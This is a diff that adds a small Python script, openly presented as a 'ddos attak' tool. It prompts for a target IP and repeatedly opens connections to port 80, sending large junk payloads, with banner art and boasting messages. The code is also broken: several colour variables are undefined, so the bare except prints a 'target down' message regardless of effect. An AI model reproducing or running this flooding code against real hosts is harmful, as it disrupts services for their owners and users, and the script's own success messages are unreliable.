@@ -1,0 +1,33 @@
+import sys,time,socket,os
+os.system('clear')
+def slowtype(text,sec):
+    for d in text + "\n":
+        sys.stdout.write(d)
+        sys.stdout.flush()
+        time.sleep(sec/100)
+        #############
+slowtype("""\033[;33;1m  
+ .----.  .----. .----.  .--.  
+/  {}  \{ {__  { {__   / {} \ 
+\      /.-._} }.-._} }/  /\  \
+ `----' `----' `----' `-'  `-'               
+""",4)
+slowtype("""\033[;36;1m this is stronger tool to do ddos attak""",6)
+slowtype('_________________________________________',6)
+print('')
+print('')
+import socket
+print("")
+ip=input("ENTER YOUR TARGET or YOUR IP : ");print ("DDos in your target is raning",ip)
+for h in range(5000):
+  try:
+      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)	
+      socket.setdefaulttimeout(1)
+      Jmeel=knig.connect((ip,80))
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿eljdbcjdjsbsjsbdjdbhdbdhdelarsolallah"*10000
+      data=data.encode("utf-8")
+      knig.send(data)
+      print('[√√√] DDos in (ip)',YY,ip,'DDOS WITH alhacker alarby is runing ',CC,'port [80]')
+
+  except :
+    print(R+"the ip is down with you by alhacker alarby ",ip)#   print(C+"                     no problem in the ip",YY,ip)
